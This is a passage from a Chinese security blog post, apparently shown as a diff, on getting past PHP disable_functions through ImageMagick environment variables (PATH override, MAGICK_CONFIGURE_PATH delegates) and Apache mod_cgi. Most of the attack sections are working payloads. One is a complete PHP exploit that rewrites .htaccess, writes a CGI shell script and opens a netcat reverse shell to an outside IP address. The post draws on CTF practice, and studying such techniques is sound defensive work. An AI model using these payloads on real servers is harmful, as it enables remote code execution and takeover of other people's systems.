+<p>Linux 中万物皆文件，执行一个命令的实质其实是执行了一个可执行文件，而系统正是通过 <code>PATH</code> 环境变量找到命令对应的可执行文件，当输入命令的时候，系统就会去<code>PATH</code> 变量记录的路径下面寻找相应的可执行文件。可以通过 <code>putenv</code> 覆盖这个变量为我们可以控制的路径，再将恶意文件上传，命名成对应的命令的名字，程序在执行这个命令的时候，就会执行我们的恶意文件。</p>
+<p>造一个可执行文件 <code>gs</code>:</p>
+<pre><code class="language-c++">#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int main() {
+    unsetenv(&quot;PATH&quot;);
+    const char* cmd = getenv(&quot;CMD&quot;);
+    system(cmd);
+    return 0;
+}
+</code></pre>
+<p>payload:</p>
+<pre><code class="language-php">putenv('PATH=/tmp/mydir');
+putenv('CMD=/readflag &gt; /tmp/mydir/output');
+chmod('/tmp/mydir/gs','0777');
+$img = new Imagick('/tmp/mydir/1.ept');
+</code></pre>
+<h3 id="magick_configure_path">MAGICK_CONFIGURE_PATH</h3>
+<p>我们在 Github 上查看 ImageMagick 的源码，在官方给出的 QuickStart.txt 中可以看到这样的内容：</p>
+<pre><code class="language-php">Configuration Files
+
+      ImageMagick depends on a number of external configuration files which
+      include colors.xml, delegates.xml, and others.
+      ImageMagick searches for configuration files in the following order, and
+      loads them if found:
+
+          $MAGICK_CONFIGURE_PATH
+          $MAGICK_HOME/etc/ImageMagick
+          $MAGICK_HOME/share/ImageMagick-7.0.2/config
+          $HOME/.config/ImageMagick/
+          &lt;client path&gt;/etc/ImageMagick/
+          &lt;current directory&gt;/
+</code></pre>
+<p>ImageMagick 的配置文件位置与环境变量有关，那么结合 <code>putenv</code> 我们就可以控制 ImageMagick 的配置。接下来，我们需要做的就是寻找一些可以帮助我们执行命令的配置项。</p>
+<p><code>delegates.xml</code> 定义了 ImageMagick 处理各种文件类型的规则，构造 exp 如下：</p>
+<pre><code class="language-xml">&lt;delegatemap&gt;
+    &lt;delegate decode=&quot;ps:alpha&quot; command=&quot;sh -c &amp;quot;/readflag &gt; /tmp/output&amp;quot;&quot;/&gt;
+&lt;/delegatemap&gt;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-php">putenv('MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
+$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
+</code></pre>
+<h3 id="magick_coder_module_path">MAGICK_CODER_MODULE_PATH</h3>
+<blockquote>
+<p><strong>MAGICK_CODER_MODULE_PATH</strong> can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory</p>
+</blockquote>
+<ul>
+<li>
+<p><a href="https://www.imagemagick.org/script/resources.php#Environment%20Variables">Document</a></p>
+</li>
+<li>
+<p><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy">Link</a></p>
+</li>
+</ul>
+<h2 id="0x08-mod_cgi">0x08 mod_cgi</h2>
+<p>Require:</p>
+<ol>
+<li>
+<p>Apache + mod_cgi Allowed</p>
+</li>
+<li>
+<p>.htaccess Allowed &amp; Writeable</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-10-49-54.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。</p>
+</blockquote>
+<p>exp（?checked=true）:</p>
+<pre><code class="language-php">&lt;?php
+$cmd = &quot;nc -c '/bin/bash' 10.11.12.13 8888&quot;; //command to be executed
+$shellfile = &quot;#!/bin/bash\n&quot;; //using a shellscript
+$shellfile .= &quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //header is needed, otherwise a 500 error is thrown when there is output
+$shellfile .= &quot;$cmd&quot;; //executing $cmd
+function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
+{
+    echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;
+}
+if (!isset($_GET['checked']))
+{
+    @file_put_contents('.htaccess', &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
+}
+else
+{
+    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
+    $writable = is_writable('.'); //current dir writable?
+    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
+        checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
+    if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))
+    {
+        echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not
+    }
+    else
+    {
+        checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //make a backup, cause you never know.
+        checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents('.htaccess',&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //.dizzle is a nice extension
+        checkEnabled(&quot;Write shell file&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //write the file
+        checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //rwx
+        echo &quot;Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;&quot;; //call the script
+    }
+}
+?&gt;
+</code></pre>
+<p><strong>- 参看 -</strong></p>
+<p>[1] <a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">浅谈几种Bypass disable_functions的方法 - Mi1k7ea</a></p>
+<p>[2] <a href="https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions - Mi1k7ea</a></p>
+<p>[3] <a href="https://www.smi1e.top/php-bypass-disabled_functions/">PHP Bypass disabled_functions - Smi1e</a></p>
+<p>[4] <a href="http://47.98.146.200/index.php/archives/47/">绕过php的disable_functions - MeetSec</a></p>
+<p>[5] <a href="https://xz.aliyun.com/t/4688">TCTF2019 WallBreaker-Easy 解题分析</a></p>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-blacklist">0x01 BlackList</a></li>
+<li><a href="#0x02-windows-com">0x02 Windows COM</a></li>
+<li><a href="#0x03-ld_preload">0x03 LD_PRELOAD</a>
+<ul>
+<li><a href="#%E5%8A%AB%E6%8C%81-getuid">劫持 getuid()</a></li>
+<li><a href="#%E5%8A%AB%E6%8C%81%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B">劫持启动进程</a></li>
+</ul>
+</li>
+<li><a href="#0x04-php-74-ffi">0x04 PHP 7.4 FFI</a></li>
+<li><a href="#0x05-bash-shellshock">0x05 Bash ShellShock</a></li>
+<li><a href="#0x06-imap_open">0x06 imap_open()</a></li>
+<li><a href="#0x07-imagemagick">0x07 ImageMagick</a>
+<ul>
+<li><a href="#command-injection">Command Injection</a></li>
+<li><a href="#ld_preload-ghostscript">LD_PRELOAD + ghostscript</a></li>
+<li><a href="#ld_preload-ffpmeg">LD_PRELOAD + ffpmeg</a></li>
+<li><a href="#%E8%A6%86%E7%9B%96-path-ghostscript">覆盖 Path + ghostscript</a></li>
+<li><a href="#magick_configure_path">MAGICK_CONFIGURE_PATH</a></li>
+<li><a href="#magick_coder_module_path">MAGICK_CODER_MODULE_PATH</a></li>
+</ul>
+</li>
+<li><a href="#0x08-mod_cgi">0x08 mod_cgi</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-11-12-2019-RedHat-CTF-md/">
+                <h3 class="post-title" style="text-align: left;">
+                  第三届红帽杯线上赛 RedHat 2019 Writeup
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-10-26-2019-anhengbei-first/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  2019 全国大学生软件测试大赛预选赛
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
